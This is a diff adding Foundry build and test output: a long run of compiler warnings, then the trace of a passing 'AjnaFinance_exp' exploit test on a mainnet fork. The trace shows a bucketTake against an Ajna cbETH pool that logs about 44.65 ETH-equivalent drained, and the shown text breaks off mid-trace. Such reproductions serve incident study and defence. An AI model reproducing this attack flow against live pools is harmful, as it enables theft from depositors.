@@ -1,0 +1,596 @@
+Compiling 23 files with Solc 0.8.35
+Solc 0.8.35 finished in 441.90ms
+Compiler run successful with warnings:
+Warning (8429): Virtual modifiers are deprecated and scheduled for removal.
+  --> basetest.sol:87:5:
+   |
+87 |     modifier balanceLog() virtual {
+   |     ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (8429): Virtual modifiers are deprecated and scheduled for removal.
+   --> basetest.sol:103:5:
+    |
+103 |     modifier balanceLog2(address target) virtual {
+    |     ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1241:9:
+     |
+1241 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1255:9:
+     |
+1255 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1263:79:
+     |
+1263 |     function assertApproxEqAbs(uint256 left, uint256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                               ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1270:77:
+     |
+1270 |     function assertApproxEqAbs(int256 left, int256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1287:9:
+     |
+1287 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1305:9:
+     |
+1305 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1315:86:
+     |
+1315 |     function assertApproxEqRel(uint256 left, uint256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1326:84:
+     |
+1326 |     function assertApproxEqRel(int256 left, int256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1335:77:
+     |
+1335 |     function assertEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1342:75:
+     |
+1342 |     function assertEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1348:46:
+     |
+1348 |     function assertEq(bool left, bool right, string calldata error) external pure;
+     |                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1354:68:
+     |
+1354 |     function assertEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1360:66:
+     |
+1360 |     function assertEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1366:68:
+     |
+1366 |     function assertEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1372:74:
+     |
+1372 |     function assertEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1378:72:
+     |
+1378 |     function assertEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1387:74:
+     |
+1387 |     function assertEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1393:74:
+     |
+1393 |     function assertEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1399:72:
+     |
+1399 |     function assertEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1405:70:
+     |
+1405 |     function assertEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1408:52:
+     |
+1408 |     function assertEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1414:50:
+     |
+1414 |     function assertEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1420:52:
+     |
+1420 |     function assertEq(address left, address right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1426:52:
+     |
+1426 |     function assertEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1432:42:
+     |
+1432 |     function assertFalse(bool condition, string calldata error) external pure;
+     |                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1440:77:
+     |
+1440 |     function assertGeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1448:75:
+     |
+1448 |     function assertGeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1455:52:
+     |
+1455 |     function assertGe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1462:50:
+     |
+1462 |     function assertGe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1470:77:
+     |
+1470 |     function assertGtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1478:75:
+     |
+1478 |     function assertGtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1485:52:
+     |
+1485 |     function assertGt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1492:50:
+     |
+1492 |     function assertGt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1500:77:
+     |
+1500 |     function assertLeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1508:75:
+     |
+1508 |     function assertLeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1515:52:
+     |
+1515 |     function assertLe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1522:50:
+     |
+1522 |     function assertLe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1530:77:
+     |
+1530 |     function assertLtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1538:75:
+     |
+1538 |     function assertLtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1545:52:
+     |
+1545 |     function assertLt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1552:50:
+     |
+1552 |     function assertLt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1559:80:
+     |
+1559 |     function assertNotEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                                ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1566:78:
+     |
+1566 |     function assertNotEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1572:49:
+     |
+1572 |     function assertNotEq(bool left, bool right, string calldata error) external pure;
+     |                                                 ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1578:71:
+     |
+1578 |     function assertNotEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1584:69:
+     |
+1584 |     function assertNotEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1590:71:
+     |
+1590 |     function assertNotEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1596:77:
+     |
+1596 |     function assertNotEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1602:75:
+     |
+1602 |     function assertNotEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1611:77:
+     |
+1611 |     function assertNotEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1617:77:
+     |
+1617 |     function assertNotEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1623:75:
+     |
+1623 |     function assertNotEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1629:73:
+     |
+1629 |     function assertNotEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1632:55:
+     |
+1632 |     function assertNotEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1638:53:
+     |
+1638 |     function assertNotEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1644:55:
+     |
+1644 |     function assertNotEq(address left, address right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1650:55:
+     |
+1650 |     function assertNotEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1656:41:
+     |
+1656 |     function assertTrue(bool condition, string calldata error) external pure;
+     |                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (4591): There are more than 256 warnings. Ignoring the rest.
+
+Ran 1 test for test/AjnaFinance_exp.sol:AjnaFinance_exp
+[PASS] testExploit() (gas: 1224628)
+Logs:
+  taker cbETH gained: 48.127374524782937205
+  taker WETH spent: 3.474032191998137190
+  net ETH-equivalent drained: 44.653342332784800015
+
+Traces:
+  [6393] AjnaFinance_exp::setUp()
+    ├─ [0] VM::createSelectFork("<rpc url>", 25854887 [2.585e7])
+    │   └─ ← [Return] 1
+    ├─ [0] VM::label(AjnaCbethPool: [0xad24FC773e125Edb223C38a39657cB64bc7C178e], "AjnaCbethPool")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(AttackerBorrower: [0x02D329Ebb1DA079A89988366b777aF300DB96F5f], "AttackerBorrower")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(cbETH: [0xBe9895146f7AF43049ca1c1AE358B0541Ea49704], "cbETH")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], "WETH")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [1425228] AjnaFinance_exp::testExploit()
+    ├─ [295735] → new AjnaTaker@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 1477 bytes of code
+    ├─ [2534] WETH::balanceOf(AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::record()
+    │   └─ ← [Return]
+    ├─ [534] WETH::balanceOf(AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::accesses(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2])
+    │   └─ ← [Return] [0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60], []
+    ├─ [0] VM::load(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ emit WARNING_UninitedSlot(who: WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], slot: 5825609806085329600055018438565692856737946360302145295836091025613143833952 [5.825e75])
+    ├─ [0] VM::load(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [534] WETH::balanceOf(AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::store(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
+    │   └─ ← [Return]
+    ├─ [534] WETH::balanceOf(AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    ├─ [0] VM::store(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60, 0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   └─ ← [Return]
+    ├─ emit SlotFound(who: WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], fsig: 0x70a08231, keysHash: 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11, slot: 5825609806085329600055018438565692856737946360302145295836091025613143833952 [5.825e75])
+    ├─ [0] VM::load(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [0] VM::store(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60, 0x0000000000000000000000000000000000000000000000056bc75e2d63100000)
+    │   └─ ← [Return]
+    ├─ [534] WETH::balanceOf(AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 100000000000000000000 [1e20]
+    ├─ [629768] AjnaTaker::bucketTakeLeg(AttackerBorrower: [0x02D329Ebb1DA079A89988366b777aF300DB96F5f])
+    │   ├─ [24420] WETH::approve(AjnaCbethPool: [0xad24FC773e125Edb223C38a39657cB64bc7C178e], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─ emit Approval(owner: AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: AjnaCbethPool: [0xad24FC773e125Edb223C38a39657cB64bc7C178e], amount: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xecc9e17fb06a10a5853ea2450329851b607e57eebbee98684a41a9f69ffb27fc: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   ├─ [485102] AjnaCbethPool::bucketTake(AttackerBorrower: [0x02D329Ebb1DA079A89988366b777aF300DB96F5f], false, 2000)
+    │   │   ├─ [482384] 0x05bB4F6362B02F17C1A3F2B047A8b23368269A21::0729f62c(00000000000000000000000002d329ebb1da079a89988366b777af300db96f5f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007d0009a96ec9b57fb64fbc60b423d1f4da7691bd35079be9895146f7af43049ca1c1ae358b0541ea49704c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001007d) [delegatecall]
+    │   │   │   ├─ [146138] PoolCommons::accrueInterest() [delegatecall]
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 8198: 0x0000000000000000000000000000000000000000000000055991519d0d49596a → 0x00000000000000000000000000000000000000000000000559915ee1d6b736dd
+    │   │   │   │   │   @ 14343: 0x0000000000000000000000000000000000000000000000000de0b72d88072571 → 0x0000000000000000000000000000000000000000000000000de0b74ff36f386a
+    │   │   │   │   │   @ 15495: 0x0000000000000000000000000000000000000000000000000de0b72d88072571 → 0x0000000000000000000000000000000000000000000000000de0b74ff36f386a
+    │   │   │   │   │   @ 15587: 0x0000000000000000000000000000000000000000000000000de0b72d88072571 → 0x0000000000000000000000000000000000000000000000000de0b74ff36f386a
+    │   │   │   │   │   @ 15575: 0x0000000000000000000000000000000000000000000000000de0b72d88072571 → 0x0000000000000000000000000000000000000000000000000de0b74ff36f386a
+    │   │   │   │   │   @ 15559: 0x0000000000000000000000000000000000000000000000000de0b72d88072571 → 0x0000000000000000000000000000000000000000000000000de0b74ff36f386a
+    │   │   │   │   │   @ 15588: 0x0000000000000000000000000000000000000000000000000de0b72d88072571 → 0x0000000000000000000000000000000000000000000000000de0b74ff36f386a
+    │   │   │   │   │   @ 15367: 0x0000000000000000000000000000000000000000000000000de0b72d88072571 → 0x0000000000000000000000000000000000000000000000000de0b74ff36f386a
+    │   │   │   │   │   @ 15583: 0x0000000000000000000000000000000000000000000000000de0b72d88072571 → 0x0000000000000000000000000000000000000000000000000de0b74ff36f386a
+    │   │   │   │   │   @ 12295: 0x0000000000000000000000000000000000000000000000000df0f206dd1e9a7d → 0x0000000000000000000000000000000000000000000000000df0f22970c77d28
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000de0b6dc21d9351f00000000000000000000000000000000000000000000000000000d44c96dddad
+    │   │   │   ├─ [241668] TakerActions::2f39ec5c(000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000040200000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000400800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055a14e9cbdfdb218d0000000000000000000000000000000000000000000000055a14e9cbdfdb218d0000000000000000000000000000000000000000000000055a14f96817559981000000000000000000000000000000000000000000000002a5090689e8c170b60000000000000000000000000000000000000000000000000de0b6dc21d9351f000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000055ff20b0ce564000000000000000000000000000000000000000000000000000000000000000100000000000000000000000002d329ebb1da079a89988366b777af300db96f5f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007d00000000000000000000000000000000000000000000000000000000000000001) [delegatecall]
+    │   │   │   │   ├─ emit BucketTakeLPAwarded(taker: AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], kicker: 0x80AD419C4783A09252Ad6a576ce059f51Cc53D47, lpAwardedTaker: 70522455669167853265598 [7.052e22], lpAwardedKicker: 0)
+    │   │   │   │   ├─ emit BucketTake(borrower: AttackerBorrower: [0x02D329Ebb1DA079A89988366b777aF300DB96F5f], index: 2000, amount: 49343739851510069406 [4.934e19], collateral: 1508697282755169949 [1.508e18], bondChange: 493437325579859365 [4.934e17], isReward: false)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 2022: 0x000000000000000000000000000000000000000000000002a9aadc9b7feeeed2 → 0
+    │   │   │   │   │   @ 0xfa5d264ad3e5c407de145c467d6de758622d83f513c04645c52b13de4f22c71b: 0x000000000000000000000000000000000000000000000002acc8275387156ca8 → 0x000000000000000000000000000000000000000000000ef1b47512735dbb4f66
+    │   │   │   │   │   @ 2008: 0x000000000000000000000000000000000000000000000002a9aadc9b7feeeed2 → 0
+    │   │   │   │   │   @ 0x1bfbbc29e3d6d623e3195ceed7ce46062e86d1b06b874d8a86c077a209b4b0b9: 0x000000000e3fef45c4d7c90200000000000000000000000006d90aa21e1b35a5 → 0x000000000e3fef45c4d7c9020000000000000000000000000000000000000000
+    │   │   │   │   │   @ 4102: 0x000000000000000000000000000000000000000000000002a9aadc9b7feeeed2 → 0
+    │   │   │   │   │   @ 0x1bfbbc29e3d6d623e3195ceed7ce46062e86d1b06b874d8a86c077a209b4b0ba: 0 → 1
+    │   │   │   │   │   @ 0x81c161efc741236499d312f3ecea8f5e3be942ded674813fb300d78b3238d9c2: 0 → 0x000000000000000000000000000000000000000000000eef07aceb1fd6a5e2be
+    │   │   │   │   │   @ 0xdeafabdc388e79cdd7170bdfdb6aee26e0435566fee743f30aade5a790b1bb03: 0x0000000000000000000000000000000000000000000000000db215443b9dd4ca → 0x00000000000000000000000000000000000000000000000006d90aa21d829f25
+    │   │   │   │   │   @ 0xfa5d264ad3e5c407de145c467d6de758622d83f513c04645c52b13de4f22c71c: 0 → 0x00000000000000000000000000000000000000000000000014eff82f6c380e9d
+    │   │   │   │   │   @ 3: 0x0000000000000000000000000000000000000000000000000db215443b9dd4ca → 0x00000000000000000000000000000000000000000000000006d90aa21d829f25
+    │   │   │   │   │   @ 2014: 0x000000000000000000000000000000000000000000000002a9aadc9b7feeeed2 → 0
+    │   │   │   │   │   @ 0x81c161efc741236499d312f3ecea8f5e3be942ded674813fb300d78b3238d9c3: 0 → 0x000000000000000000000000000000000000000000000000000000006a91b4f3
+    │   │   │   │   │   @ 0x14ce8d6cea3040c3c69fa831c15bf3fcd00677d9b2115453710b9ea940d14616: 0x000000000000000000000000000000000000000000000002ad0a74e60dbdd87b → 0x00000000000000000000000000000000000000000000000030363d52b6d09291
+    │   │   │   │   │   @ 2007: 0x000000000000000000000000000000000000000000000002a9aadc9b7feeeed2 → 0
+    │   │   │   │   │   @ 2010: 0x000000000000000000000000000000000000000000000002a9aadc9b7feeeed2 → 0
+    │   │   │   │   │   @ 2054: 0x000000000000000000000000000000000000000000000002a9aadc9b7feeeed2 → 0
+    │   │   │   │   │   @ 8198: 0x00000000000000000000000000000000000000000000000559915ee1d6b736dd → 0x000000000000000000000000000000000000000000000002acc930ebec2bfe49
+    │   │   │   │   │   @ 0x14ce8d6cea3040c3c69fa831c15bf3fcd00677d9b2115453710b9ea940d14617: 0x0000000000000000000000000000000000000000000000029bea878c48d6f413 → 0x00000000000000000000000000000000000000000000000286fa8f5cdc9ee576
